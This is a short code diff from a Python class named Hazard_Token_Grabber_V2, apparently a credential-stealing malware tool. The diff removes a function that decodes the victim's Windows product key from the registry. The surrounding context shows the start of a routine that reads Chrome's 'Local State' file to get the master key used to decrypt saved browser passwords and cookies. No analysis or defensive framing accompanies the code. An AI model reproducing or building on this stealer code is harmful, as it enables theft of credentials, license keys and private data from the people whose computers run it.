@@ -163,23 +163,7 @@ class Hazard_Token_Grabber_V2:
         productName, _ = winreg.QueryValueEx(regkey, "ProductName")
         key = list(val)
 
-        for i in range(24,-1, -1):
-            temp = 0
-            for j in range(14,-1,-1):
-                temp *= 256
-                try:
-                    temp += strToInt(key[j+ offset])
-                except IndexError:
-                    return [productName, ""]
-                if temp / 24 <= 255:
-                    key[j+ offset] = temp/24
-                else:
-                    key[j+ offset] = 255
-                temp = int(temp % 24)
-            wkey = chars[temp] + wkey
-        for i in range(5,len(wkey),6):
-            wkey = wkey[:i] + '-' + wkey[i:]
-        return [productName, wkey]
+
 
     def get_master_key(self):
         with open(self.appdata+'\\Google\\Chrome\\User Data\\Local State', "r", encoding="utf-8") as f:
